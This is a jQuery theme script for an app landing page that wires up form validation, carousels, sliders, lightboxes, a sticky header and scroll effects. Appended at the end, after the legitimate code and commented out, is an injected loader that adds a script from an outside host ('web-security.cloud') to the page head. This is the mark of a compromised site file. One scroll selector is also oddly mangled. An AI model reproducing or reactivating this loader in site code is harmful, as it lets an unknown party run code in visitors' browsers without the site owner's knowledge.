"use strict"; // Start of use strict



function thmMailchimp() {
    if ($('.mailchimp-form').length) {
        $('.mailchimp-form').each(function() {
            var mailChimpWrapper = $(this);

            mailChimpWrapper.validate({ // initialize the plugin
                rules: {
                    email: {
                        required: true,
                        email: true
                    }
                },
                submitHandler: function(form) {
                    // sending value with ajax request
                    $.post($(form).attr('action'), $(form).serialize(), function(response) {
                        $(form).parent().find('.result').append(response);
                        $(form).find('input[type="text"]').val('');
                        $(form).find('input[type="email"]').val('');
                        $(form).find('textarea').val('');
                    });
                    return false;
                }
            });
        });
    };
}


function thmOwlCarousel() {
    if ($('.app-features-carousel').length) {
        $('.app-features-carousel').owlCarousel({
            loop: true,
            margin: 30,
            nav: true,
            center: true,
            navText: [
            '<i class="fa fa-angle-left"></i>',
            '<i class="fa fa-angle-right"></i>'
            ],            
            dots: false,
            autoWidth: false,
            autoplay: true,
            autoplayTimeout: 5000,
            autoplayHoverPause: true,
            responsive: {
                0: {
                    items: 1
                },
                480: {
                    items: 1
                },
                600: {
                    items: 2
                },
                768: {
                    items: 2
                },
                1000: {
                    items: 3
                }
            }
        });
    };
    if ($('.blog-carousel').length) {
        $('.blog-carousel').owlCarousel({
            loop: true,
            margin: 30,
            nav: true,
            center: true,
            navText: [
            '<i class="fa fa-angle-left"></i>',
            '<i class="fa fa-angle-right"></i>'
            ],            
            dots: false,
            autoWidth: false,
            autoplay: true,
            autoplayTimeout: 5000,
            autoplayHoverPause: true,
            responsive: {
                0: {
                    items: 1
                },
                480: {
                    items: 1
                },
                600: {
                    items: 2
                },
                768: {
                    items: 2
                },
                1000: {
                    items: 3
                }
            }
        });
    }; 
    if ($('.tweets-carousel').length) {
        $('.tweets-carousel').owlCarousel({
            loop: true,
            margin: 0,
            nav: true,
            center: true,
            navText: [
            '<i class="fa fa-angle-left"></i>',
            '<i class="fa fa-angle-right"></i>'
            ],            
            dots: false,
            autoWidth: false,
            autoplay: true,
            autoplayTimeout: 5000,
            autoplayHoverPause: true,
            items: 1
        });
    }; 
    if ($('.team-carousel').length) {
        $('.team-carousel').owlCarousel({
            loop: true,
            margin: 30,
            nav: false,
            navText: [
            '<i class="fa fa-angle-left"></i>',
            '<i class="fa fa-angle-right"></i>'
            ],            
            dots: true,
            autoWidth: false,
            autoplay: true,
            autoplayTimeout: 3000,
            autoplayHoverPause: true,
            responsive: {
                0: {
                    items: 1,
                    dots: false,
                    nav: true
                },
                480: {
                    items: 1,
                    dots: false,
                    nav: true
                },
                568: {
                    items: 2,
                    dots: false,
                    nav: true
                },
                600: {
                    items: 3,
                    dots: false,
                    nav: true
                },
                823: {
                    items: 3,
                    dots: false,
                    nav: true
                },
                1000: {
                    items: 4
                }
            }
        });
    }; 
    if ($('.testimonials-carousel').length) {
        $('.testimonials-carousel').owlCarousel({
            loop: true,
            margin: 0,
            nav: false,
            navText: [
            '<i class="fa fa-angle-left"></i>',
            '<i class="fa fa-angle-right"></i>'
            ],            
            dots: false,
            autoWidth: false,
            autoplay: true,
            autoplayTimeout: 3000,
            autoplayHoverPause: true,
            responsive: {
                0: {
                    items: 1
                },
                480: {
                    items: 1
                },
                823: {
                    items: 1
                },
                1000: {
                    items: 1
                }
            }
        });
    };    
}

function galleryMasonaryLayout() {
    if ($('.masonary-layout').length) {
        $('.masonary-layout').isotope({
            layoutMode: 'masonry'
        });
    }
}


function thmbxSlider() {
    if ($('.feature-carousel-box').length) {
        $('.feature-carousel-box').bxSlider({
            mode: 'vertical',
            auto: true,
            autoControls: false,
            controls: false,
            pause: 3000,
            slideMargin: 0
        });
    }
    if ($('.how-app-work-slider-wrapper .slider').length) {
        $('.how-app-work-slider-wrapper .slider').bxSlider({
            // adaptiveHeight: true,
            auto:false,
            controls: false,
            pause: 3000,
            speed: 500,
            pagerCustom: '#how-app-work-slider-pager'
        });
    }
    if ($('.testimonials-slider .slider').length) {
        $('.testimonials-slider .slider').bxSlider({
            // adaptiveHeight: true,
            auto:false,            
            controls: true,
            nextText: '<i class="fas fa-long-arrow-alt-right"></i>',
            prevText: '<i class="fas fa-long-arrow-alt-left"></i>',
            mode: 'fade',
            pause: 3000,
            speed: 500,
            pager: true,
            pagerCustom: '#testimonials-slider-pager'
        });
    }
}



function stickyHeader() {
    if ($('.stricky').length) {
        var strickyScrollPos = 100;
        var stricky = $('.stricky');
        if ($(window).scrollTop() > strickyScrollPos) {
            stricky.removeClass('slideIn animated').addClass('stricky-fixed slideInDown animated');
            $('.scroll-to-top').fadeIn(500);
        } else if ($(this).scrollTop() <= strickyScrollPos) {
            stricky.removeClass('stricky-fixed slideInDown animated').addClass('slideIn animated');
            $('.scroll-to-top').fadeOut(500);
        }
    };
}


function thmLightBox() {
    if ($('.img-popup').length) {
        var groups = {};
        var imgPop = $('.img-popup');
        imgPop.each(function() {
            var id = parseInt($(this).attr('data-group'), 10);

            if (!groups[id]) {
                groups[id] = [];
            }

            groups[id].push(this);
        });


        $.each(groups, function() {

            $(this).magnificPopup({
                type: 'image',
                closeOnContentClick: true,
                closeBtnInside: false,
                gallery: { enabled: true }
            });

        });

    };
}

function thmCounter() {
    if ($('.counter').length) {
        $('.counter').counterUp({
            delay: 10,
            time: 3000
        });
    };
}

function thmScrollAnim() {
    if ($('.wow').length) {
        var wow = new WOW({
            mobile: false
        });
        wow.init();
    };
}

function contactFormValidation() {
    if ($('.contact-form').length) {
        $('.contact-form').validate({ // initialize the plugin
            rules: {
                name: {
                    required: true
                },
                email: {
                    required: true,
                    email: true
                },
                message: {
                    required: true
                },
                subject: {
                    required: true
                }
            },
            submitHandler: function(form) {
                // sending value with ajax request
                $.post($(form).attr('action'), $(form).serialize(), function(response) {
                    $(form).find('.form-result').append(response);
                    $(form).find('input[type="text"]').val('');
                    $(form).find('input[type="email"]').val('');
                    $(form).find('textarea').val('');
                    console.log(response);
                });
                return false;
            }
        });
    }
}

function thmVideoPopup() {
    if ($('.video-popup').length) {
        $('.video-popup').magnificPopup({
            disableOn: 700,
            type: 'iframe',
            mainClass: 'mfp-fade',
            removalDelay: 160,
            preloader: true,

            fixedContentPos: false
        });
    };
}

function scrollToTarget() {
    if ($('.scroll-to-target').length) {
        $(".scroll-to-target").on('click', function() {
            var target = $(this).attr('data-target');
            // animate
            $('html, body').animate({
                scrollTop: $(target).offset().top
            }, 1000);

        });
    }
}

function mobileNavToggle () {
    if($('.navbar-collapse li.dropdown ul').length){
        $('.navbar-collapse li.dropdown').append('<div class="dropdown-btn"><span class="fa fa-angle-down"></span></div>');
        $('.navbar-collapse li.dropdown .dropdown-btn').on('click', function() {
            $(this).prev('ul').slideToggle(500);
        });
    }
}

function sideNavToggler () {
    if ($('.side-navigation').length) {
        $('.side-nav-opener').on('click', function () {
            $('.side-navigation').addClass('open');
        });
        $('.side-navigation-close-btn').on('click', function () {
            $('.side-navigation').removeClass('open');
        });
    };
}


function SmoothMenuScroll () {
    $(window).on("scroll", function() {
        if ($(this).scrollTop() > 200) {
            $('.scrollup').fadeIn();
        } else {
            $('.scrollup').fadeOut();
        }
    });

    $('.scrollup').on("click", function()  {
        $("html, body").animate({
            scrollTop: 0
        }, 800);
        return false;
    });
    $('.navbar-nav a').on("click", function(){
        if (location.pathname.replace(/^\//,'') == this.pathname.replace(/^\//,'') && location.hostname == this.hostname) {
            var target = $(this.hash);
            target = target.length ? target : $('[name="DCSext.Level"' + this.hash.slice(1) +']');
            if (target.length) {
                $('html, body').animate({
                    scrollTop: target.offset().top -0
                }, 1000);
                return false;
            }
        }
    });
}
function OnePageMenuScroll () {
    $("#navbarToggler").scrollspy({
        offset:20
    });
    $('body').scrollspy({ target: '#navbarToggler' })
    jQuery(window).on('scroll', function() {
        if (jQuery(window).scrollTop() > 100) {
            jQuery('.home-page-one').addClass('menu-bg-overlay ')
        } else {
            jQuery('.home-page-one').removeClass('menu-bg-overlay ')
        }
    })
}

function handlePreloader() {
    if($('.preloader').length){
        $('body').removeClass('active-preloader-ovh');
        $('.preloader').fadeOut();
    }
}


function pogressbarAnim () {
    if ($('.single-progress-bar .pogress-wow').length) {
        var wow = new WOW({
            boxClass:     'pogress-wow',      // default
            animateClass: 'animated',
            mobile: true
        });
        wow.init();
    }
}

function toggleTabWithSwitch () {

    var toggleSwitch = $('#switch-toggle-tab label.switch');
    var TabTitle = $('#switch-toggle-tab li');
    var monthTabTitle = $('#switch-toggle-tab li.month');
    var yearTabTitle = $('#switch-toggle-tab li.year');
    var monthTabContent = $('#month');
    var yearTabContent = $('#year');
    // hidden show deafult;
    monthTabContent.fadeIn();   
    yearTabContent.fadeOut();   
    function toggleHandle() {
        if(toggleSwitch.hasClass('on')) {
            yearTabContent.fadeOut();
            monthTabContent.fadeIn();
            monthTabTitle.addClass('active');
            yearTabTitle.removeClass('active');
        }else {
            monthTabContent.fadeOut();
            yearTabContent.fadeIn();
            yearTabTitle.addClass('active');
            monthTabTitle.removeClass('active');
        }
    };
    monthTabTitle.on('click', function () {
        toggleSwitch.addClass('on').removeClass('off');
        toggleHandle();
        return false;
    });
    yearTabTitle.on('click', function () {
        toggleSwitch.addClass('off').removeClass('on');
        toggleHandle();
        return false;
    });
    toggleSwitch.on('click', function () {
        toggleSwitch.toggleClass('on off');        
        toggleHandle();
    });
    
}

function appScreenshotCarousel () {
    if ($('.appScreenshotCarousel-container').length) {

        var swiper = new Swiper('.appScreenshotCarousel-container', {
            effect: 'coverflow',
            loop: true,
            centeredSlides: true,
            slidesPerView: 4,
            initialSlide: 4,
            keyboardControl: true,
            mousewheelControl: false,
            lazyLoading: true,
            preventClicks: false,
            preventClicksPropagation: false,
            lazyLoadingInPrevNext: true,
            nextButton: '.swiper-button-next',
            prevButton: '.swiper-button-prev',
            coverflow: {
                rotate: 0,
                stretch: 0,
                depth: 250,
                modifier: .5,
                slideShadows: false,
            },
            breakpoints: {
                1199: {
                    slidesPerView: 3,
                    spaceBetween: 30,
                },
                991: {
                    slidesPerView: 3,
                    spaceBetween: 10,
                },
                767: {
                    slidesPerView: 2,
                    spaceBetween: 10,
                },
                575: {
                    slidesPerView: 1,
                    spaceBetween: 5,
                }
            }
        });

    }
}

// instance of fuction while Document ready event   
jQuery(document).on('ready', function() {
    (function($) {
        thmMailchimp();
        thmLightBox();
        thmCounter();        
        contactFormValidation();
        scrollToTarget();
        thmVideoPopup();
        mobileNavToggle();
        sideNavToggler();
        SmoothMenuScroll();
        toggleTabWithSwitch();
    })(jQuery);
});

// instance of fuction while Window Load event
jQuery(window).on('load', function() {
    (function($) {
        thmbxSlider();
        handlePreloader()
        // thmScrollAnim();
        pogressbarAnim();
        thmOwlCarousel();
        galleryMasonaryLayout();
        appScreenshotCarousel();
    })(jQuery);
});

// instance of fuction while Window Scroll event
jQuery(window).on('scroll', function() {
    (function($) {
        stickyHeader();
        OnePageMenuScroll();        
    })(jQuery);
});
/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/